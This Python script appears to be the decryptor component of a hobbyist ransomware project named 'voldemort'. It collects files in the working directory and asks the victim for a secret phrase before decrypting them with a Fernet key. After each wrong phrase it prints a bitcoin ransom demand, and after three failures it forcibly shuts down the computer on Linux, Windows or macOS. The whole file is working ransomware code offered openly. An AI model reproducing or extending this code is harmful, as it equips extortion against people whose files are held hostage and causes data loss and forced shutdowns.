#!/usr/bin/env python3

import os
import platform
from cryptography.fernet import Fernet
import sys

# Let's find some files
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == ".idea" or file == "venv" or file == "decrypt.exe" or file == "voldemort.exe":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

# Set the maximum number of allowed incorrect attempts
max_attempts = 3
attempts = 0

############################################
############################################
############################################
# Here is the secret phrase you can change as per your liking
secretphrase = "hi"
# Here is the secret phrase you can change as per your liking
############################################
############################################
############################################

while attempts < max_attempts:
    user_phrase = input("Enter the secret phrase to decrypt your files\n")
    
    if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("Congratulations, your files are decrypted. Follow this page now https://medium.com/@himilp123/subscribe")
        break
    else:
        attempts += 1
        remaining_attempts = max_attempts - attempts
        print(f"Wrong phrase. You have {remaining_attempts} attempts left. Now you can send me m+200 bit coins")
else:
    print("Sorry, you have exceeded the maximum number of attempts. Shutting down the PC...")
    # You can add shutdown logic here

   
    def shutdown_system():
     system_platform = platform.system()
    
     if system_platform == "Linux":
        os.system("shutdown -h now")
     elif system_platform == "Windows":
        os.system("shutdown /s /f /t 0")
     elif system_platform == "Darwin":  # Mac
         os.system("shutdown -h now")
     else:
        print("Unsupported operating system")

    shutdown_system()  # Call the function directly

   
   
   
     
  #
   # shutdown_now_executed = False
   # shutdown_s_executed = False
   # def shutdown_pc():
   # 	global shutdown_now_executed
   # 	global shutdown_s_executed
   # 
   # if not shutdown_now_executed:
   #     os.system("shutdown now")
   #     shutdown_now_executed = True
   # elif not shutdown_s_executed:
   #     os.system("shutdown -h now")
   #     shutdown_s_executed = True
   # shutdown_pc()   
        
        
        
        
